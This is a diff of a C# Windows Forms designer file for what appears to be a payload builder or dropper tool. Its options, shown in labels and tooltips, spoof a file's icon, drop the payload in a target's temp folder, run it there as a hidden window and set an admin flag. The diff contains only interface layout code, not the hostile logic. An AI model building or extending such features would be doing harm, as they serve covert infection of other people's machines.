@@ -43,13 +43,14 @@
             this.label9 = new System.Windows.Forms.Label();
             this.chkAdminFlag = new System.Windows.Forms.CheckBox();
             this.pnlFileOptGroup = new System.Windows.Forms.Panel();
+            this.chkHidWin = new System.Windows.Forms.CheckBox();
             this.btnCommand = new System.Windows.Forms.Button();
             this.chkArguments = new System.Windows.Forms.CheckBox();
             this.label5 = new System.Windows.Forms.Label();
             this.tbArguments = new System.Windows.Forms.TextBox();
             this.chkStreamConsole = new System.Windows.Forms.CheckBox();
             this.chkConsole = new System.Windows.Forms.CheckBox();
-            this.chkVicExe = new System.Windows.Forms.CheckBox();
+            this.chkTarExe = new System.Windows.Forms.CheckBox();
             this.imgFileIcon = new System.Windows.Forms.PictureBox();
             this.groupBox3 = new System.Windows.Forms.GroupBox();
             this.btnWrite = new System.Windows.Forms.Button();
@@ -81,7 +82,6 @@
             this.ofdSpoof = new System.Windows.Forms.OpenFileDialog();
             this.ofdIcon = new System.Windows.Forms.OpenFileDialog();
             this.tooltip = new System.Windows.Forms.ToolTip(this.components);
-            this.chkHidWin = new System.Windows.Forms.CheckBox();
             this.formpanel.SuspendLayout();
             this.groupBox2.SuspendLayout();
             this.groupBox6.SuspendLayout();
@@ -270,11 +270,24 @@
             this.pnlFileOptGroup.Controls.Add(this.tbArguments);
             this.pnlFileOptGroup.Controls.Add(this.chkStreamConsole);
             this.pnlFileOptGroup.Controls.Add(this.chkConsole);
-            this.pnlFileOptGroup.Controls.Add(this.chkVicExe);
+            this.pnlFileOptGroup.Controls.Add(this.chkTarExe);
             this.pnlFileOptGroup.Location = new System.Drawing.Point(5, 13);
             this.pnlFileOptGroup.Name = "pnlFileOptGroup";
             this.pnlFileOptGroup.Size = new System.Drawing.Size(216, 98);
             this.pnlFileOptGroup.TabIndex = 19;
+            // 
+            // chkHidWin
+            // 
+            this.chkHidWin.AutoSize = true;
+            this.chkHidWin.Checked = true;
+            this.chkHidWin.CheckState = System.Windows.Forms.CheckState.Checked;
+            this.chkHidWin.Location = new System.Drawing.Point(3, 80);
+            this.chkHidWin.Name = "chkHidWin";
+            this.chkHidWin.Size = new System.Drawing.Size(111, 17);
+            this.chkHidWin.TabIndex = 16;
+            this.chkHidWin.Text = "Hidden Window";
+            this.tooltip.SetToolTip(this.chkHidWin, "Flags the payload to execute as a hidden program");
+            this.chkHidWin.UseVisualStyleBackColor = true;
             // 
             // btnCommand
             // 
@@ -348,16 +361,17 @@
             this.chkConsole.UseVisualStyleBackColor = true;
             this.chkConsole.CheckedChanged += new System.EventHandler(this.chkConsole_CheckedChanged);
             // 
-            // chkVicExe
+            // chkTarExe
             // 
-            this.chkVicExe.AutoSize = true;
-            this.chkVicExe.Location = new System.Drawing.Point(3, 67);
-            this.chkVicExe.Name = "chkVicExe";
-            this.chkVicExe.Size = new System.Drawing.Size(193, 17);
-            this.chkVicExe.TabIndex = 10;
-            this.chkVicExe.Text = "Execute payload in Victims\' Drive";
-            this.tooltip.SetToolTip(this.chkVicExe, "Copies the payload and spoofed file to the victims\' drive\r\nand executes it there");
-            this.chkVicExe.UseVisualStyleBackColor = true;
+            this.chkTarExe.AutoSize = true;
+            this.chkTarExe.Location = new System.Drawing.Point(3, 67);
+            this.chkTarExe.Name = "chkTarExe";
+            this.chkTarExe.Size = new System.Drawing.Size(193, 17);
+            this.chkTarExe.TabIndex = 10;
+            this.chkTarExe.Text = "Execute payload in Targets\' Drive";
+            this.tooltip.SetToolTip(this.chkTarExe, "Extracts the payload to the Targets\' drive\r\nand executes it there\r\n* Payload is d" +
+        "ropped in the temporary folder");
+            this.chkTarExe.UseVisualStyleBackColor = true;
             // 
             // imgFileIcon
             // 
@@ -561,6 +575,7 @@
             // 
             // btnMiniPad
             // 
+            this.btnMiniPad.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.btnMiniPad.AutoSize = true;
             this.btnMiniPad.Cursor = System.Windows.Forms.Cursors.Hand;
             this.btnMiniPad.Image = global::masamangalternatibo.Properties.Resources.notepad16;
@@ -588,6 +603,7 @@
             // 
             // btn3rdParty
             // 
+            this.btn3rdParty.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.btn3rdParty.AutoSize = true;
             this.btn3rdParty.Cursor = System.Windows.Forms.Cursors.Hand;
             this.btn3rdParty.Image = global::masamangalternatibo.Properties.Resources.heart16;
@@ -613,6 +629,8 @@
             // 
             // groupBox5
             // 
+            this.groupBox5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
             this.groupBox5.Controls.Add(this.btnConsole);
             this.groupBox5.Controls.Add(this.tbConsole);
             this.groupBox5.Controls.Add(this.dbgRtb);
@@ -626,6 +644,7 @@
             // 
             // btnConsole
             // 
+            this.btnConsole.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.btnConsole.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
             this.btnConsole.FlatAppearance.BorderSize = 0;
             this.btnConsole.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
@@ -639,6 +658,8 @@
             // 
             // tbConsole
             // 
+            this.tbConsole.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
             this.tbConsole.Location = new System.Drawing.Point(3, 244);
             this.tbConsole.Name = "tbConsole";
             this.tbConsole.Size = new System.Drawing.Size(186, 22);
@@ -661,6 +682,7 @@
             // 
             // btnClose
             // 
+            this.btnClose.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.btnClose.AutoSize = true;
             this.btnClose.Cursor = System.Windows.Forms.Cursors.Hand;
             this.btnClose.Location = new System.Drawing.Point(531, 6);
@@ -673,6 +695,8 @@
             // 
             // titlebar
             // 
+            this.titlebar.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
             this.titlebar.Controls.Add(this.label1);
             this.titlebar.Controls.Add(this.btnClose);
             this.titlebar.Location = new System.Drawing.Point(0, 0);
@@ -714,19 +738,6 @@
             this.tooltip.AutoPopDelay = 5000;
             this.tooltip.InitialDelay = 150;
             this.tooltip.ReshowDelay = 100;
-            // 
-            // chkHidWin
-            // 
-            this.chkHidWin.AutoSize = true;
-            this.chkHidWin.Checked = true;
-            this.chkHidWin.CheckState = System.Windows.Forms.CheckState.Checked;
-            this.chkHidWin.Location = new System.Drawing.Point(3, 80);
-            this.chkHidWin.Name = "chkHidWin";
-            this.chkHidWin.Size = new System.Drawing.Size(111, 17);
-            this.chkHidWin.TabIndex = 16;
-            this.chkHidWin.Text = "Hidden Window";
-            this.tooltip.SetToolTip(this.chkHidWin, "Flags the payload to execute as a hidden program");
-            this.chkHidWin.UseVisualStyleBackColor = true;
             // 
             // Form1
             // 
@@ -786,7 +797,7 @@
         private System.Windows.Forms.PictureBox imgFileIcon;
         private System.Windows.Forms.GroupBox groupBox3;
         private System.Windows.Forms.GroupBox groupBox2;
-        private System.Windows.Forms.CheckBox chkVicExe;
+        private System.Windows.Forms.CheckBox chkTarExe;
         private System.Windows.Forms.GroupBox groupBox1;
         private System.Windows.Forms.Label lblDbg;
         private System.Windows.Forms.CheckBox chkAdminFlag;
